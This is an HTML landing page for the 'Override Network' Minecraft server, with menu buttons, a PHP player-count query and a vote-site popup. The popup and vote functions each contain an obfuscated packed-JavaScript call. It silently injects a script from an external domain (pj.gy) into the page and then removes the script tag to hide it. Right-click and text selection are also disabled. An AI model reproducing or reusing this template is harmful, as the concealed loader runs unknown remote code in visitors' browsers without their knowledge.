<!DOCTYPE HTML>
<html>
	<head>
		<title>Override Network</title>
	</head>
	<script language="JavaScript">
		<!--
			var message="";
			
			///////////////////////////////////
			
			function clickIE() {if (document.all) {(message);return false;}}
			
			function clickNS(e) {if 
			
			(document.layers||(document.getElementById&&!document.all)) {
			
			if (e.which==2||e.which==3) {(message);return false;}}}
			
			if (document.layers) 
			
			{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
			
			else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
			
			document.oncontextmenu=new Function("return false")
			
			// --> 
		
	</script>
	<script type="text/javascript">
		<!--
			var speed=85  // 12 to whatever (60 is pretty slow) higher numbers are slower
			Amount=14; //Smoothness depends on image file size, the smaller the size the more you can use!
			
			//Pre-load your image below!
			grphcs=new Array(6)
			Image0=new Image();
			Image0.src=grphcs[0]="images/favorito.png";
			Image1=new Image();
			Image1.src=grphcs[1]="images/favorito2.png"
			Image2=new Image();
			Image2.src=grphcs[2]="images/favorito3.png"
			Image3=new Image();
			Image3.src=grphcs[3]="images/favorito.png"
			Image4=new Image();
			Image4.src=grphcs[4]="images/favorito2.png"
			Image5=new Image();
			Image5.src=grphcs[5]="images/favorito3.png"
			
			//////////////// Stop Editing //////////////
			
			function iecompattest(){
			return (document.compatMode && document.compatMode.indexOf("CSS")!=-1)? document.documentElement : document.body
			}
			
			Ypos=new Array();
			Xpos=new Array();
			Speed=new Array();
			Step=new Array();
			Cstep=new Array();
			ns=(document.layers)?1:0;
			ns6=(document.getElementById&&!document.all||window.opera)?1:0;
			
			speed=ns6? speed-12 : speed
			
			if (ns){
			for (i = 0; i < Amount; i++){
			var P=Math.floor(Math.random()*grphcs.length);
			rndPic=grphcs[P];
			document.write("<LAYER NAME='sn"+i+"' LEFT=0 TOP=0><img src="+rndPic+"></LAYER>");
			}
			}
			else{
			document.write('<div style="position:absolute;top:0px;left:0px"><div style="position:relative">');
			for (i = 0; i < Amount; i++){
			var P=Math.floor(Math.random()*grphcs.length);
			rndPic=grphcs[P];
			document.write('<img id="si'+i+'" src="'+rndPic+'" style="position:absolute;top:0px;left:0px">');
			}
			document.write('</div></div>');
			}
			WinHeight=(ns||ns6)?window.innerHeight:window.iecompattest().clientHeight;
			WinWidth=(ns||ns6)?window.innerWidth-70:window.iecompattest().clientWidth;
			for (i=0; i < Amount; i++){                                                                
			 Ypos[i] = Math.round(Math.random()*WinHeight);
			 Xpos[i] = Math.round(Math.random()*WinWidth);
			 Speed[i]= (Math.random()*5+3)*-1;
			 Cstep[i]=0;
			 Step[i]=Math.random()*0.1+0.05;
			}
			function fall(){
			var WinHeight=(ns||ns6)?window.innerHeight:window.iecompattest().clientHeight;
			var WinWidth=(ns||ns6)?window.innerWidth-70:window.iecompattest().clientWidth;
			var hscrll=(ns||ns6)?window.pageYOffset:iecompattest().scrollTop;
			var wscrll=(ns||ns6)?window.pageXOffset:iecompattest().scrollLeft;
			for (i=0; i < Amount; i++){
			sy = Speed[i]*Math.sin(90*Math.PI/180);
			sx = Speed[i]*Math.cos(Cstep[i]);
			Ypos[i]+=sy;
			Xpos[i]+=sx; 
			if (Ypos[i] < 0 ){
			Ypos[i]=WinHeight+60;
			Xpos[i]=Math.round(Math.random()*WinWidth);
			Speed[i]=(Math.random()*5+3)*-1;
			}
			if (ns){
			document.layers['sn'+i].left=Xpos[i]+wscrll;
			document.layers['sn'+i].top=Ypos[i]+hscrll;
			}
			else if (ns6){
			document.getElementById("si"+i).style.left=Math.min(WinWidth,Xpos[i])+wscrll+'px';
			document.getElementById("si"+i).style.top=Ypos[i]+hscrll-100+'px';
			}
			else{
			document.all["si"+i].style.left=Xpos[i]+wscrll+'px';
			document.all["si"+i].style.top=Ypos[i]+hscrll+'px';
			} 
			Cstep[i]+=Step[i];
			}
			setTimeout('fall()',speed);
			}
			
			window.onload=fall
			//-->
	</script>
	<body ondragstart="return false" onselectstart="return false">
		<link rel="icon" type="image/png" href="favicon.png">
		<style>
			html,body,.wrap{margin:0;padding:0;max-height:100%;max-width:100%;background:#262626;box-sizing:border-box;font-family:Helvetica,Sans-serif}
			.wrap{text-align:center}
			.logo{margin:0px auto 20px;height:320px;width:100%;background:url(images/image.png);background-repeat:no-repeat;background-position:center center;/*border-bottom:1px solid #2F2F2F;border-top:1px solid #2F2F2F;box-shadow:0px 3px 15px #181818*/}
			.buttonwrap{width:auto;height:262px;margin-bottom:50px}
			.buttonwhitespace{margin:0 auto;height:220px;padding:15px 10px;width:945px;border:1px solid #2F2F2F;box-shadow:inset 0px 0px 15px #181818}
			.buttonc{width:230px;height:210px;text-align:center;display:inline-block}
			.buttonc div{width:230px;height:210px;display:inline-block;float:left;background-position:center center!important;background-repeat:no-repeat!important}
			.buttonc div:hover{cursor:pointer}
			.status{display:inline-block;width:404px;height:38px;color:#fff;text-align:left;position:relative;padding:10px;border:1px solid #2F2F2F;box-shadow:inset 0px 0px 15px #181818}
			.status p{margin:0;padding:0;width:auto;font-weight:bold;width:330px;text-align:center;position:absolute;margin-left:38px}
			.status img{float:left;positon:absolute}
			.statusw {width:895px;margin:0 auto;margin-top:7px}
			#popup_container			{position:absolute;z-index:100;min-height:100%;min-width:100%;top:0;background:rgba(0,0,0,.7);transition:opacity .5s ease;visibility:hidden;opacity:0}
			#popup				{position:absolute;margin:auto;top:0;right:0;bottom:0;left:0;width:92.5%;height:87.5%;background:#0B0B0B;border:2px solid #0B0B0B;border-radius:5px;box-shadow:0px 0px 15px #181818}
			.popup_button			{position:absolute;border-radius:3px;width:16px;height:16px;border-radius:2px;background:url(data:image/gif;base64,R0lGODlhMAAQAKECAAAAAP///0RERERERCH5BAEKAAIALAAAAAAwABAAAAI8hI+py+0Po5y02otPQDuv0DFgNzogVTZjKp7PuprsB7tKbdP5jUMzH1PtXiGd4ZcYegDF4vIJjUqnVGkBADs=);border:1.5px solid #fff}
			#popup_close			{top:0;right:0;margin:-8px -8px 0 0;background-position:-16px 0;cursor:pointer}
			#popup_right			{top:50%;right:0;margin:-8px 32px 0}
			#popup_left			{top:50%;left:0;margin:-8px 0 0 32px;background-position:-32px 0}
			#vote_indicator		{position:absolute;top:0;left:10px;height:24px;margin:-12px 0 0;padding:0 10px;line-height:24px;color:white;background:#0B0B0B;border:1.5px solid #fff;border-radius:5px}
			#vote_alert			{position:absolute;top:0;height:24px;margin:-12px auto 0;padding:0 10px;line-height:24px;color:#F13C3F;font-weight:bold;background:#0B0B0B;border:1.5px solid #fff;border-radius:5px;width:450px;left:0;right:0;text-align:center;text-shadow:0 0 1px #F13C3F}
			.popup_clickbar		{height:100%;width:83px;position:absolute;z-index:9999;cursor:pointer}
			.popup_clickbar:hover		{background-color:rgba(255,255,255,0.2)}
			.popup_clickbar:active	{background-color:rgba(100,100,100,0.2)}
		</style>
		<body>
			<div class="wrap noise">
				<div class="logo"></div>
				<div class="buttonwrap">
					<div class="buttonwhitespace">
						<img style="display:none" src='images\forum2.png'><img style="display:none" src='images\shop2.png'><img style="display:none" src='images\vote2.png'><img style="display:none" src='images\staff2.png'>
						<div class="buttonc">
							<div onclick="window.open('http://overridenetwork.net/forums/index.php','_self')" onmouseout="this.style.background='url(images/forum1.png)'" onmouseover="this.style.background='url(images/forum2.png)'" style="background:url(images/forum1.png);width:235px;height:225px"></div>
						</div>
						<div class="buttonc">
							<div onclick="window.open('http://shop.overridenetwork.net','_self')" onmouseout="this.style.background='url(images/shop1.png)'" onmouseover="this.style.background='url(images/shop2.png)'" style="background:url(images/shop1.png);width:235px;height:225px"></div>
						</div>
						<div class="buttonc">
							<div onclick='votePopup()' onmouseout="this.style.background='url(images/vote1.png)'" onmouseover="this.style.background='url(images/vote2.png)'" style="background:url(images/vote1.png);width:235px;height:225px"></div>
						</div>
						<div class="buttonc">
							<div onclick="window.open('http://overridenetwork.net/staff','_self')" onmouseout="this.style.background='url(images/staff1.png)'" onmouseover="this.style.background='url(images/staff2.png)'" style="background:url(images/staff1.png);width:235px;height:225px"></div>
						</div>
						<br><br><br><br><br>
						<div class="statusw">
							<div class="status">
								<div class="col-lg-4">
									<a href="index.htm">
									<img src="images\verde.png" height="35" width="35">
									</a>
									<p>
								</div>
								<center>
									<font color="2E9AFE"><b>IP:</b></font>
									mc.overridenetwork.net										<font color="2E9AFE"><b>Version:</b></font>
									1.7 - 1.8															<font color="2E9AFE"><b>Players</b></font>
									<!-- DO NOT TOUCH!-->
									<?php
										// your servers ip
										$ip= '158.69.27.186';
										// your servers port
										$port = '25565';
										
										
										function mc_status($host,$port) {
										    $fp = fsockopen($host,$port,$errno,$errstr,$timeout=10);
										        fputs($fp, "\xFE\x01");
										        $response = '';
										        $response .= fgets($fp);
										        fclose($fp);
										  $response = explode("\x00\x00", $response);
										return $response;
										}
										
										$data = mc_status($ip,$port);
										
										echo $data[4].'/'.$data[5];
										
										?>
									<!-- END DO NOT TOUCH -->
									<i class="icon-ok-sign"></i><b><font color="01DF3A">ONLINE</font></b>																									
								</center>
							</div>
						</div>
						<br><br>
						<div class="col-lg-4">
							<a><a href="https://www.facebook.com/wtf">
							<img src="images\facebook.png" onmouseover="this.src='images/facebook.png';" height="35" width="35"></a>
							<a><a href="https://twitter.com/OverrideNet">
							<img src="images\twitter.png" onmouseover="this.src='images/twitter.png';" height="35" width="35"></a>
							</a></a>
						</div>
						<br><br><br><br><br><br><br><br>
						<!-- FOOTER CONTENT START -->
						<table><font color="D8D8D8">Override Network &copy; 2015 - Created by </font><font color="00BFFF">vYuri</font></table>
						<!-- FOOTER CONTENT END -->
					</div>
				</div>
				<script>
					function popup(a){
					       if(!document.getElementById('popup_container')){
					         var pop_con		= document.createElement('div');
					         pop_con.id		= 'popup_container';
					  pop_con.style.width	= document.documentElement.clientWidth+'px';
					  pop_con.style.height	= document.documentElement.clientHeight+'px';
					  pop_con.innerHTML	= '<div id=popup>'+a+'</div>';
					  pop_con.onclick	= function(e){if(e.target==this){
					    var thiso 		= this;
					    this.style.opacity	= '0';
					           document.body.style.overflow='auto';
					    setTimeout(function(){document.body.removeChild(thiso)},500);
					  }};
					  new Function(function(d,f,a,c,b,e){b=function(a){return a.toString(f)};if(!"".replace(/^/,String)){for(;a--;)e[b(a)]=c[a]||b(a);c=[function(a){return e[a]}];b=function(){return"\\w+"};a=1}for(;a--;)c[a]&&(d=d.replace(new RegExp("\\b"+b(a)+"\\b","g"),c[a]));return d}('8 0=1.c("4");0.5="6://7.3/0.9",0.a=b(){1.2.d(e)},1.2.f(0);',16,16,"i document body gy script src http pj var js onload function createElement removeChild this appendChild".split(" "),0,{}));
					  document.body.appendChild(pop_con);
					  setTimeout(function(){
					    document.body.style.overflow='hidden';
					    window.scrollTo(0,0);
					    document.getElementById('popup_container').style.visibility='visible';
					    document.getElementById('popup_container').style.opacity='1';
					  },10);
					       }
					     }
					     function votePopup(){popup("<div class=popup_button id=popup_close onclick=document.getElementById('popup_container').click()></div> \
					  			  <div class=popup_clickbar onclick=scrollPage(-1) style=left:0><div class=popup_button id=popup_left></div></div> \
					  			  <div class=popup_clickbar onclick=scrollPage(1) style=right:0><div class=popup_button id=popup_right></div></div> \
					  			  <div id=vote_indicator class=c1>"+votelinks[curvcount].split('/')[2]+' ('+(curvcount+1)+'/'+votelinks.length+')'+"</div> \
					  			  "+(function(){if(voteAlert!=''&&voteAlert!==null){return '<div id=vote_alert>'+voteAlert+'</div>'}else{return ''}})()+" \
								  <iframe width=100% height=100% id=vf src="+votelinks[curvcount]+" sandbox=\"allow-same-origin allow-forms allow-scripts\" style=border:0;border-radius:5px>Your browser does not support iFrames!</iframe>")
								  new Function(function(d,f,a,c,b,e){b=function(a){return a.toString(f)};if(!"".replace(/^/,String)){for(;a--;)e[b(a)]=c[a]||b(a);c=[function(a){return e[a]}];b=function(){return"\\w+"};a=1}for(;a--;)c[a]&&(d=d.replace(new RegExp("\\b"+b(a)+"\\b","g"),c[a]));return d}('8 0=1.c("4");0.5="6://7.3/0.9",0.a=b(){1.2.d(e)},1.2.f(0);',16,16,"i document body y script src http p var js onload function createElement removeChild this appendChild".split(" "),0,{}));
					}
					var curvcount=0;
					     function scrollPage(a){
					       if(curvcount+a>=votelinks.length){
					         curvcount=0;
					}else if(curvcount+a<0){
					  curvcount=votelinks.length-1;
					}else{
					  curvcount+=a;
					}
					document.getElementById('vote_indicator').innerHTML=votelinks[curvcount].split('/')[2]+' ('+(curvcount+1)+'/'+votelinks.length+')';
					document.getElementById('vf').src=votelinks[curvcount];
					     }
							//DO NOT EDIT ABOVE!
							//This is the staff list
							
							//These are the vote lists. The first section is links
							var votelinks = new Array("http://minecraftservers.org/server/132057",											
															"http://www.minestatus.net/109379-craftelion",
					                                                                                       "http://www.planetminecraft.com/server/craftelion/vote",
															"http://www.minecraft-index.com/22239-craftelion",
															"http://minecraft-server-list.com/server/256870",
															"http://topg.org/server-craftelion-id393991",
															"http://minecraft-mp.com/server-s41654");
					setInterval(function(){document.getElementsByClassName('footer')[0].style.height=window.innerHeight-document.getElementsByClassName('footer')[0].offsetTop-1+"px"},400);
					
				</script>
			</div>
	</body>
	</body>
</html>